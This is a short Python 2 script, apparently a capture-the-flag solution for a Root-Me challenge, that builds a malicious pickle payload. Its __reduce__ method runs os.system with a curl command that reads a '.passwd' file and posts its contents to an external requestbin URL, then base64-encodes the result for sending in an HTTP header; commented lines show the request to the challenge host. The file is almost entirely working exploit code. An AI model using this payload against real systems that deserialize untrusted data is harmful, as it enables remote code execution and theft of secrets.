import cPickle
import base64
import os

class payload(object):
    def __reduce__(self):
        self.cmd = 'curl -X POST -d "pass=$(cat /challenge/app-script/ch5/.passwd)" https://requestbin.io/1n9ov9q1'
        return(os.system, (self.cmd,))
exploit = str(base64.b64encode(cPickle.dumps(payload())))
print(exploit)

# c = HTTPConnection(host="challenge02.root-me.org", port=60005)
# #we need to base 64 encode it
# #and then decode it to acsii as python 3 stores it as a byte string
# headers = {}
# headers['Authenticate'] = str(token)
#
# c.request('AUTH', 'admin', 'HTTP/1.0', headers=headers)
# #get the response back
# res = c.getresponse()
# # at this point you could check the status etc
# # this gets the page text
#
# print(res.status, res.reason)
# print(res.read())
